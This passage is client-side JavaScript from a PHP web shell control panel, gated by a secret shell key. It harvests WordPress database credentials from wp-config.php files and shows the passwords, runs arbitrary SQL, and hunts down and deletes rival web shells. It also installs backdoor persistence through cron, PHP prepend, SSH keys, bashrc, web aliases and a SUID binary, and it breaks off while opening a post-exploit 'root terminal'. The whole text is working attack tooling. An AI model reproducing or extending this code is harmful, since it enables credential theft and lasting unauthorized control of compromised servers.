                '<div style="background:var(--bg);padding:6px 8px;border-radius:4px;margin:4px 0;font-size:11.5px;border-left:3px solid var(--primary);">' +
                '<span style="color:var(--warn);font-weight:bold;">' + escapeHtml(m.pattern) + '</span>' +
                (file.preview && m.context ? '<div style="color:var(--text-dim);margin-top:4px;font-family:var(--mono);white-space:pre-wrap;word-break:break-all;">' + escapeHtml(m.context) + '</div>' : '') +
                '</div>'
            ).join('') +
            '</div>' +
            '<div class="website-meta">' +
            '<span>' + escapeHtml(file.size) + '</span>' +
            '<span>' + (file.writable ? 'Writable' : 'Read-only') + '</span>' +
            '</div></div>';
    });
    content.innerHTML = html;
}
function dirname(path) {
    return path.substring(0, path.lastIndexOf('/'));
}
function exploreDatabase() {
    openModal('dbExploreModal');
    const content = document.getElementById('dbExploreContent');
    content.innerHTML = '<p>⏳ Searching for wp-config.php files... This may take a moment.</p>';
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=explore_db')
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
            }
            return response.text();
        })
        .then(text => {
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Invalid JSON response:', text);
                throw new Error('Invalid server response. Check PHP error logs.');
            }
            if (!Array.isArray(data)) {
                throw new Error('Unexpected response format');
            }
            return data;
        })
        .then(data => {
            if (data.length === 0) {
                content.innerHTML = '<p class="text-danger">❌ No WordPress configurations found.</p>';
                return;
            }
            let html = `<p class="text-primary">🔍 Found ${data.length} configuration(s):</p>`;
            html += '<div class="max-h-400 overflow-y-auto">';
            data.forEach((config, index) => {
                html += `
                    <div class="border border-green my-10 p-10 bg-dark rounded-4">
                        <h4 class="m-0 mb-10 text-cyan">- Config #${index + 1}</h4>
                        <p class="text-11 my-3 text-muted"><strong>File:</strong> ${escapeHtml(config.filepath)}</p>
                        <p class="text-sm"><strong>🖥️ Host:</strong> <span class="text-warning">${escapeHtml(config.db_host)}</span></p>
                        <p class="text-sm"><strong>🔌 Port:</strong> <span class="text-warning">${config.db_port}</span></p>
                        <p class="text-sm"><strong>🗄️ Database</strong> <span class="text-warning">${escapeHtml(config.db_name)}</span></p>
                        <p class="text-sm"><strong>👤 Username:</strong> <span class="text-primary">${escapeHtml(config.db_user)}</span></p>
                        <p class="text-sm"><strong>🔒 Password:</strong> <span class="text-red bg-red-dark px-5 py-2 rounded-3">${escapeHtml(config.db_pass)}</span></p>
                        <p class="text-sm"><strong>📋 Table Prefix:</strong> ${escapeHtml(config.table_prefix)}</p>
                        <div class="mt-10">
                            <button onclick="connectFromExplore('${config.db_host}', ${config.db_port}, '${config.db_name}', '${config.db_user}', '${config.db_pass}')">
                                " Connect to this DB
                            </button>
                        </div>
                    </div>
                `;
            });
            html += '</div>';
            content.innerHTML = html;
        })
        .catch(error => {
            console.error('Explore DB Error:', error);
            content.innerHTML = '<div class="text-red p-10 bg-red-dark rounded-4">' +
                '<p><strong>❌ Error:</strong> ' + escapeHtml(error.message) + '</p>' +
                '<p class="text-11 mt-10">Possible causes:</p>' +
                '<ul class="text-11 my-5 pl-20">' +
                '<li>PHP execution timeout</li>' +
                '<li>Memory limit exceeded</li>' +
                '<li>Permission denied on directories</li>' +
                '<li>Check browser console for details</li>' +
                '</ul></div>';
        });
}
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
function connectFromExplore(host, port, name, user, pass) {
    closeModal('dbExploreModal');
    document.getElementById('dbHost').value = host;
    document.getElementById('dbPort').value = port;
    document.getElementById('dbName').value = name;
    document.getElementById('dbUser').value = user;
    document.getElementById('dbPass').value = pass;
    openModal('dbConnectModal');
}
function testDbConnection() {
    const statusDiv = document.getElementById('dbConnectStatus');
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<p class="text-muted">⏳ Testing connection...</p>';
    const formData = new FormData(document.getElementById('dbConnectForm'));
    formData.append('action', 'connect_db');
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                statusDiv.innerHTML = '<p class="text-primary">✅ Connection successful!</p>';
            } else {
                statusDiv.innerHTML = '<p class="text-danger">❌ Connection failed: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            statusDiv.innerHTML = '<p class="text-danger">❌ Error: ' + error.message + '</p>';
        });
}
function connectToDatabase() {
    const host = document.getElementById('dbHost').value;
    const port = document.getElementById('dbPort').value;
    const name = document.getElementById('dbName').value;
    const user = document.getElementById('dbUser').value;
    const pass = document.getElementById('dbPass').value;
    if (!host || !name || !user) {
        alert('Please fill in Host, Database Name, and Username');
        return;
    }
    currentDbConfig = {
        host: host,
        port: port || 3306,
        name: name,
        user: user,
        pass: pass
    };
    closeModal('dbConnectModal');
    openModal('dbManagerModal');
    const tablesDiv = document.getElementById('dbTablesList');
    tablesDiv.innerHTML = '<p class="text-muted p-10">⏳ Loading tables...</p>';
    const formData = new FormData();
    formData.append('action', 'get_tables');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div class="bg-dark-2 p-10 rounded-4 mb-10">`;
                html += `<div class="text-green text-11">🖥️ MySQL ${escapeHtml(data.server_info)}</div>`;
                html += `<div class="text-cyan text-11 mt-5">📊 ${data.tables.length} table(s)</div>`;
                html += `</div>`;
                html += '<ul>';
                data.tables.forEach(table => {
                    html += `<li onclick="viewTableData('${table}')"> ${escapeHtml(table)}</li>`;
                });
                html += '</ul>';
                tablesDiv.innerHTML = html;
            } else {
                tablesDiv.innerHTML = '<p class="text-danger p-4">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            tablesDiv.innerHTML = '<p class="text-danger p-4">❌ Error: ' + error.message + '</p>';
        });
}
function viewTableData(tableName) {
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p class="text-muted">⏳ Loading table data...</p>';
    const formData = new FormData();
    formData.append('action', 'get_table_data');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('table', tableName);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div class="bg-dark-2 px-15 py-10 rounded-4 mb-15" style="display:flex;flex-wrap:wrap;gap:6px 16px;align-items:center;">`;
                html += `<span class="text-green text-14"> <strong>${escapeHtml(tableName)}</strong></span>`;
                html += `<span class="text-muted">Total: ${data.total_rows} rows</span>`;
                html += `<span class="text-cyan">Showing: ${data.data.length}</span>`;
                html += `</div>`;
                if (data.columns.length > 0) {
                    html += '<div class="table-wrap border border-green rounded-4" style="padding-bottom:0">';
                    html += '<table class="w-full text-md">';
                    html += '<thead><tr>';
                    data.columns.forEach(col => {
                        html += `<th>${escapeHtml(col)}</th>`;
                    });
                    html += '</tr></thead><tbody>';
                    data.data.forEach((row) => {
                        html += `<tr>`;
                        data.columns.forEach(col => {
                            const val = row[col] !== null ? row[col] : '<span class="text-white">NULL</span>';
                            html += `<td data-label="${escapeHtml(col)}" title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}" style="word-break:break-all">${escapeHtml(String(val))}</td>`;
                        });
                        html += '</tr>';
                    });
                    html += '</tbody></table></div>';
                } else {
                    html += '<p class="text-muted p-20 text-center">Table is empty</p>';
                }
                document.getElementById('sqlQuery').value = `SELECT * FROM \`${tableName}\` LIMIT 50;`;
                resultDiv.innerHTML = html;
            } else {
                resultDiv.innerHTML = '<p class="text-danger">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            resultDiv.innerHTML = '<p class="text-danger">❌ Error: ' + error.message + '</p>';
        });
}
function executeSqlQuery() {
    const query = document.getElementById('sqlQuery').value.trim();
    if (!query) {
        alert('Please enter a SQL query');
        return;
    }
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p class="text-muted">▶️ Executing query...</p>';
    const formData = new FormData();
    formData.append('action', 'execute_sql');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('sql_query', query);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            let html = '';
            html += `<div style="background: #222; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 6px;">`;
            html += `<span class="text-secondary">⏱️ ${data.execution_time}</span>`;
            if (data.success) {
                if (data.message) {
                    html += `<span class="text-primary">✅ ${escapeHtml(data.message)}</span>`;
                    if (data.affected_rows !== undefined) {
                        html += `<span class="text-muted">Rows affected: ${data.affected_rows}</span>`;
                    }
                    html += `</div>`;
                } else if (data.data) {
                    html += `<span class="text-primary">✅ ${data.num_rows} rows returned</span>`;
                    html += `</div>`;
                    if (data.columns && data.columns.length > 0) {
                        html += '<div class="table-wrap border border-green rounded-4" style="padding-bottom:0">';
                        html += '<table class="w-full text-md">';
                        html += '<thead><tr>';
                        data.columns.forEach(col => {
                            html += `<th>${escapeHtml(col)}</th>`;
                        });
                        html += '</tr></thead><tbody>';
                        data.data.forEach((row) => {
                            html += `<tr>`;
                            data.columns.forEach(col => {
                                const val = row[col] !== null ? row[col] : '<span class="text-white">NULL</span>';
                                html += `<td data-label="${escapeHtml(col)}" title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}" style="word-break:break-all">${escapeHtml(String(val))}</td>`;
                            });
                            html += '</tr>';
                        });
                        html += '</tbody></table></div>';
                    }
                }
            } else {
                html += `<span class="text-danger">❌ Error</span></div>`;
                html += `<div style="background: #300; padding: 15px; border-radius: 4px; color: #f88;">`;
                html += `<strong>Error:</strong><br>${escapeHtml(data.error)}`;
                html += `</div>`;
            }
            resultDiv.innerHTML = html;
        })
        .catch(error => {
            resultDiv.innerHTML = '<p class="text-danger">❌ Error: ' + error.message + '</p>';
        });
}
function clearSqlResult() {
    document.getElementById('sqlResult').innerHTML = '<p class="text-white">Execute a query to see results...</p>';
}

// 🔥 PRIVILEGE ESCALATION MODULAR TOOLS - Route each tool independently
// Shell Scanner Functions

// Toggle scan configuration section
function toggleScanConfig(element) {
    const configContent = element.nextElementSibling;
    const toggle = element.querySelector('.config-toggle');

    if (configContent.style.display === 'none') {
        configContent.style.display = 'block';
        toggle.textContent = '▼';
    } else {
        configContent.style.display = 'none';
        toggle.textContent = '▶';
    }
}

// Filter shells based on selected criteria
function filterShellResults(shells, filterType, filterValue) {
    if (!filterType || filterValue === 'all') {
        return shells;
    }

    return shells.filter(shell => {
        if (filterType === 'reason') {
            return shell.reasons.some(r => r.includes(filterValue));
        }
        if (filterType === 'confidence') {
            if (filterValue === 'high') return shell.confidence >= 80;
            if (filterValue === 'medium') return shell.confidence >= 50 && shell.confidence < 80;
            if (filterValue === 'low') return shell.confidence < 50;
        }
        if (filterType === 'has_payload') {
            return shell.decoded_payloads && shell.decoded_payloads.length > 0;
        }
        return true;
    });
}

async function scanOtherShells(options = {}) {
    // Get output div - prioritize modal output first
    let outputDiv = document.getElementById('privescPersistOutput');
    if (!outputDiv) {
        outputDiv = document.getElementById('privescOutput');
    }

    if (!outputDiv) {
        alert('❌ Error: Output area not found. Please refresh page.');
        return;
    }

    outputDiv.style.display = 'block';

    // Build query params
    let queryParams = '?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_shells';
    if (options.scan_dir) {
        queryParams += '&scan_dir=' + encodeURIComponent(options.scan_dir);
    }
    if (options.max_depth) {
        queryParams += '&max_depth=' + options.max_depth;
    }
    if (options.max_files) {
        queryParams += '&max_files=' + options.max_files;
    }

    // Show progress with collapsible config
    const configInfo = `
        <div style="background:#0a0a0a;border:1px solid #0f0;padding:0;margin-bottom:10px;border-radius:4px;">
            <div onclick="toggleScanConfig(this)" style="background:#1a3a1a;padding:10px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;user-select:none;">
                <span style="color:#0f0;font-weight:bold;font-size:11.5px;">⚙️ Scan Configuration</span>
                <span class="config-toggle" style="color:#0f0;font-size:12px;">▼</span>
            </div>
            <div class="config-content" style="display:block;padding:10px;font-size:10.5px;color:#0f0;border-top:1px solid #0f0;">
                📁 Dir: ${options.scan_dir || 'Current'}<br>
                📊 Depth: ${options.max_depth || 5} levels<br>
                📄 Max Files: ${options.max_files || 5000}
            </div>
        </div>
        <div style="text-align:center;padding:30px;"><p style="font-size:30px;animation:pulse 1s infinite;">🕵️</p><p class="text-primary">Scanning for web shells...</p><p style="color:#888;font-size:11.5px;">This may take 30-60 seconds depending on directory size</p></div>
    `;
    outputDiv.innerHTML = configInfo;

    try {
        const response = await fetch(queryParams);

        // Check if response is OK
        if (!response.ok) {
            outputDiv.innerHTML = '<span class="text-danger">❌ HTTP Error: ' + response.status + ' ' + response.statusText + '</span>';
            return;
        }

        // Get response text first for debugging
        const responseText = await response.text();

        // Check if response is empty
        if (!responseText || responseText.trim() === '') {
            outputDiv.innerHTML = '<span class="text-danger">❌ Empty response from server</span>';
            console.error('Empty response from scan endpoint');
            return;
        }

        // Try to parse JSON
        let data;
        try {
            data = JSON.parse(responseText);
        } catch (parseErr) {
            outputDiv.innerHTML = '<span class="text-danger">❌ Invalid JSON response:<br><code style="font-size:10.5px;">' + responseText.substring(0, 200) + '</code></span>';
            console.error('JSON parse error:', parseErr, 'Response:', responseText);
            return;
        }

        if (data.success) {
            displayShellScanResults(data, outputDiv);
            outputDiv.innerHTML += '<div style="background:#1a3a1a;padding:10px;margin-top:10px;border-left:3px solid #0f0;color:#0f0;">✅ Scan complete! Scanned ' + data.scanned + ' files, found ' + data.found + ' potential shells.</div>';
        } else {
            outputDiv.innerHTML = '<span class="text-danger">❌ Scan failed: ' + (data.error || 'Unknown error') + '</span>';
        }
    } catch (err) {
        outputDiv.innerHTML = '<span class="text-danger">❌ Fetch error: ' + err.message + '</span>';
        console.error('Scan error:', err);
    }
}

function displayShellScanResults(data, outputDiv) {
    // If outputDiv not provided, auto-detect
    if (!outputDiv) {
        outputDiv = document.getElementById('privescOutput');
        if (!outputDiv) {
            outputDiv = document.getElementById('privescPersistOutput');
        }
    }

    if (!outputDiv) {
        console.error('❌ No output element found for shell scan results');
        alert('❌ Error: Cannot find output element. Please refresh page.');
        return;
    }

    // Analyze shells to build detection reason filters with counts
    const reasonCounts = {};
    data.shells.forEach(shell => {
        shell.reasons.forEach(reason => {
            reasonCounts[reason] = (reasonCounts[reason] || 0) + 1;
        });
    });

    let html = '<div style="background:#1a1a1a;border:1px solid #f44;padding:15px;margin-bottom:15px;">';
    html += '<h3 style="color:#f44;margin:0 0 10px 0;">🕵️ SHELL SCAN RESULTS</h3>';
    html += '<p style="color:#888;margin:0;font-size:12px;">Scanned: ' + data.scanned + ' PHP files | Found: ' + data.found + ' potential shells</p>';
    if (data.recursive && data.max_depth !== undefined) {
        html += '<p style="color:#666;margin:5px 0 0 0;font-size:11.5px;">🔍 Recursive scan (max depth: ' + data.max_depth + ' levels)</p>';
    }
    html += '</div>';

    // Simplified Filters Section - only by detection reasons with counts
    if (data.shells.length > 0 && Object.keys(reasonCounts).length > 0) {
        html += '<div style="background:#0a0a0a;border:1px solid #0f0;padding:12px;margin-bottom:12px;border-radius:4px;">';
        html += '<p style="color:#0f0;margin:0 0 8px 0;font-size:11.5px;font-weight:bold;">🔍 FILTER BY DETECTION REASON:</p>';
        html += '<div style="display:flex;gap:6px;flex-wrap:wrap;font-size:10.5px;">';

        // "All" button
        html += '<button class="filter-btn" data-filter-reason="all" style="background:#1a3a1a;color:#0f0;padding:6px 10px;border:1px solid #0f0;cursor:pointer;border-radius:3px;font-size:10.5px;font-weight:bold;transition:all 0.2s;"><strong>All</strong> (' + data.shells.length + ')</button>';

        // Reason buttons sorted by count (highest first)
        const sortedReasons = Object.entries(reasonCounts)
            .sort((a, b) => b[1] - a[1])
            .map(([reason, count]) => ({ reason, count }));

        sortedReasons.forEach(item => {
            html += '<button class="filter-btn" data-filter-reason="' + htmlEscape(item.reason) + '" style="background:#1a1a1a;color:#0f0;padding:6px 10px;border:1px solid #0f0;cursor:pointer;border-radius:3px;font-size:10.5px;transition:all 0.2s;">' + htmlEscape(item.reason) + ' (' + item.count + ')</button>';
        });

        html += '</div>';
        html += '</div>';
    }

    if (data.shells.length === 0) {
        html += '<div style="background:#001a00;border:1px solid #0f0;padding:15px;">';
        html += '<p style="color:#0f0;margin:0;">✅ No suspicious shells detected!</p>';
        html += '</div>';
    } else {
        html += '<div id="shellResults">';
        data.shells.forEach((shell, index) => {
            const confidenceColor = shell.confidence >= 80 ? '#f44' : shell.confidence >= 50 ? '#ff0' : '#f80';
            const confidenceText = shell.confidence >= 80 ? 'HIGH' : shell.confidence >= 50 ? 'MEDIUM' : 'LOW';

            // Store filter attributes on result item
            const hasPayload = shell.decoded_payloads && shell.decoded_payloads.length > 0 ? 'true' : 'false';
            const reasonsStr = shell.reasons.map(r => r).join('|');

            html += '<div class="shell-result" data-confidence="' + shell.confidence + '" data-reason="' + htmlEscape(reasonsStr) + '" data-has-payload="' + hasPayload + '" style="border:1px solid ' + confidenceColor + ';margin:10px 0;padding:12px;background:#1a1a1a;border-radius:4px;">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
            html += '<h4 style="color:' + confidenceColor + ';margin:0;font-size:14px;">' + (index + 1) + '. ' + shell.filename + '</h4>';
            html += '<span style="background:' + confidenceColor + ';color:#000;padding:2px 8px;border-radius:4px;font-size:11.5px;font-weight:bold;">' + confidenceText + ' (' + shell.confidence + '%)</span>';
            html += '</div>';

            html += '<p style="color:#6cf;margin:5px 0;font-size:11.5px;word-break:break-all;">📁 ' + shell.path + '</p>';
            if (shell.relative_path && shell.depth !== undefined) {
                html += '<p style="color:#666;margin:5px 0;font-size:10.5px;">📂 Relative: ' + shell.relative_path + ' (Depth: ' + shell.depth + ')</p>';
            }
            html += '<p class="text-muted text-sm">📊 Size: ' + formatBytes(shell.size) + ' | 📅 Modified: ' + shell.modified + '</p>';

            html += '<p style="color:#ff0;margin:5px 0;font-size:11.5px;">⚠️ Reasons:</p>';
            html += '<ul style="margin:5px 0;color:#888;font-size:11.5px;">';
            shell.reasons.forEach(reason => {
                html += '<li>' + reason + '</li>';
            });
            html += '</ul>';

            // Display decoded payloads if ASCII detected
            if (shell.decoded_payloads && shell.decoded_payloads.length > 0) {
                html += '<p style="color:#f0f;margin:10px 0 5px 0;font-size:11.5px;">🔓 Decoded ASCII Payloads:</p>';
                shell.decoded_payloads.forEach((payload, i) => {
                    html += '<div style="background:#0a0a0a;border:1px solid #f0f;padding:8px;margin:5px 0;border-radius:3px;font-size:10.5px;">';
                    html += '<p style="color:#f0f;margin:0 0 3px 0;"><strong>[' + payload.type + ']</strong> (' + payload.length + ' bytes)</p>';
                    html += '<p style="color:#0f0;margin:0;word-break:break-all;font-family:monospace;">' + htmlEscape(payload.decoded) + '</p>';
                    html += '</div>';
                });
            }

            html += '<div style="margin-top:10px;display:flex;gap:10px;">';
            html += '<button class="jump-btn" data-dir="' + htmlEscape(encodeURIComponent(shell.dir)) + '" style="background:#0f0;color:#000;padding:5px 15px;border:none;cursor:pointer;font-size:11.5px;font-weight:bold;">📂 Jump to Location</button>';
            html += '<button class="delete-btn" data-path="' + htmlEscape(encodeURIComponent(shell.path)) + '" data-filename="' + htmlEscape(encodeURIComponent(shell.filename)) + '" style="background:#f44;color:#fff;padding:5px 15px;border:none;cursor:pointer;font-size:11.5px;font-weight:bold;">🗑️ Delete File</button>';
            html += '</div>';

            html += '</div>';
        });
        html += '</div>';
    }

    outputDiv.innerHTML = html;

    // Attach event listeners (after HTML rendered)
    setTimeout(() => {
        // Filter buttons
        document.querySelectorAll('.filter-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const reason = this.dataset.filterReason || 'all';
                filterByReason(reason);
            });
        });

        // Jump to Location buttons
        document.querySelectorAll('.jump-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const dir = decodeURIComponent(this.dataset.dir);
                jumpToShellLocation(dir);
            });
        });

        // Delete File buttons
        document.querySelectorAll('.delete-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const path = decodeURIComponent(this.dataset.path);
                const filename = decodeURIComponent(this.dataset.filename);
                deleteShellFile(path, filename);
            });
        });
    }, 0);
}

// Filter shell results by detection reason
function filterByReason(reason) {
    const results = document.querySelectorAll('.shell-result');
    let visibleCount = 0;

    // Update active button state
    document.querySelectorAll('.filter-btn').forEach(btn => {
        const btnReason = btn.dataset.filterReason;
        const isActive = btnReason === reason;

        btn.style.background = isActive ? '#0a3a0a' : '#1a1a1a';
        btn.style.fontWeight = isActive ? 'bold' : 'normal';
        btn.style.boxShadow = isActive ? '0 0 8px rgba(0,255,0,0.3)' : 'none';
    });

    // Apply filter
    results.forEach(result => {
        let show = true;

        if (reason !== 'all') {
            const reasonsStr = result.dataset.reason || '';
            const reasons = reasonsStr.length > 0 ? reasonsStr.split('|') : [];
            if (!reasons.includes(reason)) {
                show = false;
            }
        }

        result.style.display = show ? 'block' : 'none';
        if (show) visibleCount++;
    });

    // Show message if no results
    const resultsDiv = document.getElementById('shellResults');
    if (visibleCount === 0 && resultsDiv) {
        let message = resultsDiv.querySelector('.filter-message');
        if (!message) {
            message = document.createElement('div');
            message.className = 'filter-message';
            message.style.cssText = 'background:#1a1a1a;border:1px solid #888;padding:12px;margin:10px 0;color:#888;text-align:center;font-size:11.5px;border-radius:3px;';
            message.textContent = '⚠️ No results match the selected filter';
            resultsDiv.appendChild(message);
        }
        message.style.display = 'block';
    } else {
        const message = resultsDiv?.querySelector('.filter-message');
        if (message) message.style.display = 'none';
    }
}

function jumpToShellLocation(dir) {
    try {
        console.log('jumpToShellLocation called with dir:', dir);
        const decodedDir = decodeURIComponent(dir);
        console.log('Decoded dir:', decodedDir);

        // Open in NEW TAB
        const url = '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(decodedDir);
        console.log('Opening new tab with URL:', url);
        window.open(url, '_blank');

        // Close modal
        closeModal('privescPersistModal');
    } catch (e) {
        console.error('Jump to location error:', e);
        alert('Error opening directory: ' + e.message);
    }
}

async function deleteShellFile(path, filename) {
    const decodedPath = decodeURIComponent(path);
    const decodedFilename = decodeURIComponent(filename);
    
    if (!confirm('⚠️ WARNING: Are you sure you want to delete "' + decodedFilename + '"?\n\nThis action cannot be undone!')) {
        return;
    }
    
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    statusDiv.innerHTML = '⏳ Deleting ' + decodedFilename + '...';
    
    try {
        const formData = new FormData();
        formData.append('action', 'delete_shell');
        formData.append('target', decodedPath);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            statusDiv.className = 'privesc-status success';
            statusDiv.innerHTML = '✅ ' + decodedFilename + ' deleted successfully!';
            // Refresh scan results
            setTimeout(() => scanOtherShells(), 1000);
        } else {
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ Failed to delete: ' + (data.error || 'Unknown error');
        }
    } catch (err) {
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

// Persistence installer - individual mechanism
function persistInstall(type, btn) {
    var statusEl = document.getElementById('persistStatus_' + type);
    var resultArea = document.getElementById('persistResultArea');
    var urlsBox = document.getElementById('persistUrlsBox');
    var urlsArea = document.getElementById('persistUrlsArea');
    var card = btn ? btn.closest('.persist-card') : null;
    if (statusEl) { statusEl.textContent = 'Installing...'; statusEl.style.background = '#332800'; statusEl.style.color = '#ff0'; }
    if (btn) { btn.disabled = true; btn.textContent = 'Installing...'; }
    if (card) { card.style.borderColor = '#ff0'; card.style.background = ''; }
    if (resultArea) resultArea.value = 'Installing ' + type + '...\n';
    if (urlsBox) urlsBox.style.display = 'none';

    var formData = new FormData();
    formData.append('action', 'install_persistence_' + type);

    fetch('', { method: 'POST', body: formData })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (btn) { btn.disabled = false; btn.textContent = 'Install'; }
            if (data.success) {
                if (statusEl) { statusEl.textContent = 'Installed'; statusEl.style.background = '#003300'; statusEl.style.color = '#0f0'; }
                if (card) { card.style.background = '#001a00'; card.style.borderColor = '#0f0'; }
            } else {
                if (statusEl) { statusEl.textContent = 'Failed'; statusEl.style.background = '#330000'; statusEl.style.color = '#f44'; }
                if (card) { card.style.background = '#1a0000'; card.style.borderColor = '#f44'; }
            }
            if (resultArea) resultArea.value = data.guide || (data.success ? 'Installed successfully.' : 'Error: ' + (data.error || 'Unknown error'));
            if (data.urls && data.urls.length > 0 && urlsBox && urlsArea) {
                urlsArea.value = data.urls.join('\n');
                urlsBox.style.display = 'block';
            }
            if (data.private_key_url && urlsBox && urlsArea) {
                var existing = urlsArea.value ? urlsArea.value + '\n' : '';
                urlsArea.value = existing + data.private_key_url;
                urlsBox.style.display = 'block';
            }
        })
        .catch(function(err) {
            if (btn) { btn.disabled = false; btn.textContent = 'Install'; }
            if (statusEl) { statusEl.textContent = 'Error'; statusEl.style.background = '#330000'; statusEl.style.color = '#f44'; }
            if (card) { card.style.background = '#1a0000'; card.style.borderColor = '#f44'; }
            if (resultArea) resultArea.value = 'Network error: ' + err.message;
        });
}

// Persistence installer - install all mechanisms sequentially
function persistInstallAll() {
    var types = ['cron', 'web_backup', 'php_prepend', 'ssh', 'bashrc', 'web_alias', 'suid'];
    var resultArea = document.getElementById('persistResultArea');
    var urlsBox = document.getElementById('persistUrlsBox');
    var urlsArea = document.getElementById('persistUrlsArea');
    if (resultArea) resultArea.value = 'Installing all persistence mechanisms...\n\n';
    if (urlsBox) urlsBox.style.display = 'none';
    var completed = 0;
    var summary = '';
    var allGuides = '';
    var allUrls = [];

    types.forEach(function(type) {
        var statusEl = document.getElementById('persistStatus_' + type);
        var card = statusEl ? statusEl.closest('.persist-card') : null;
        if (statusEl) { statusEl.textContent = 'Installing...'; statusEl.style.background = '#332800'; statusEl.style.color = '#ff0'; }
        if (card) { card.style.borderColor = '#ff0'; card.style.background = ''; }

        var formData = new FormData();
        formData.append('action', 'install_persistence_' + type);

        fetch('', { method: 'POST', body: formData })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                completed++;
                var ok = data.success;
                if (statusEl) {
                    statusEl.textContent = ok ? 'Installed' : 'Failed';
                    statusEl.style.background = ok ? '#003300' : '#330000';
                    statusEl.style.color = ok ? '#0f0' : '#f44';
                }
                if (card) {
                    card.style.background = ok ? '#001a00' : '#1a0000';
                    card.style.borderColor = ok ? '#0f0' : '#f44';
                }
                summary += (ok ? '[OK] ' : '[FAIL] ') + type.toUpperCase() + '\n';
                if (data.guide) allGuides += '\n' + data.guide + '\n';
                if (data.urls) data.urls.forEach(function(u) { allUrls.push(u); });
                if (data.private_key_url) allUrls.push(data.private_key_url);
                if (completed === types.length) {
                    if (resultArea) {
                        resultArea.value = 'INSTALLATION COMPLETE (' + completed + '/' + types.length + ')\n';
                        resultArea.value += '========================================\n\n';
                        resultArea.value += summary + '\n';
                        resultArea.value += '========================================\n';
                        resultArea.value += 'DETAIL GUIDES\n';
                        resultArea.value += '========================================\n';
                        resultArea.value += allGuides;
                    }
                    if (allUrls.length > 0 && urlsBox && urlsArea) {
                        urlsArea.value = allUrls.join('\n');
                        urlsBox.style.display = 'block';
                    }
                }
            })
            .catch(function() {
                completed++;
                if (statusEl) { statusEl.textContent = 'Error'; statusEl.style.background = '#330000'; statusEl.style.color = '#f44'; }
                if (card) { card.style.background = '#1a0000'; card.style.borderColor = '#f44'; }
                summary += '[ERR] ' + type.toUpperCase() + ' (network error)\n';
                if (completed === types.length && resultArea) {
                    resultArea.value = 'INSTALLATION COMPLETE (' + completed + '/' + types.length + ')\n========================================\n\n' + summary;
                }
            });
    });
}

function persistCopyResult() {
    var area = document.getElementById('persistResultArea');
    if (!area || !area.value) return;
    if (navigator.clipboard) {
        navigator.clipboard.writeText(area.value).then(function() { alert('Copied!'); });
    } else {
        area.select();
        document.execCommand('copy');
        alert('Copied!');
    }
}

function persistCopyUrls() {
    var area = document.getElementById('persistUrlsArea');
    if (!area || !area.value) return;
    if (navigator.clipboard) {
        navigator.clipboard.writeText(area.value).then(function() { alert('URLs copied!'); });
    } else {
        area.select();
        document.execCommand('copy');
        alert('URLs copied!');
    }
}

// 🎯 INTERACTIVE ROOT TERMINAL FUNCTIONS
let suidBackdoorPath = null;  // Simpan path SUID backdoor jika ada
let rootTerminalActive = false;

// Tampilkan terminal setelah root berhasil
function showRootTerminal() {
    const terminal = document.getElementById('rootTerminal');
    const output = document.getElementById('rootTerminalOutput');
    
    terminal.style.display = 'block';
    
    // 🎯 Check if we have auto-collected data
    const hasAutoCollect = window.lastCollectedRootData && window.lastCollectedSummary;
    
    let html = `<span class="text-primary font-bold">🎉 ROOT ACCESS GRANTED!</span>
<span class="text-muted">═══════════════════════════════════════</span>
<span class="text-warning">⚠️  CRITICAL: Root access is TEMPORARY!</span>
<span class="text-muted">   Root only exists during exploit execution.</span>
`;

    // 🎯 Show auto-collect info if available
    if (hasAutoCollect) {
        html += `
<span class="text-primary font-bold">✅ AUTO-COLLECT COMPLETE!</span>
<span class="text-secondary">   Critical data was captured during exploit:</span>
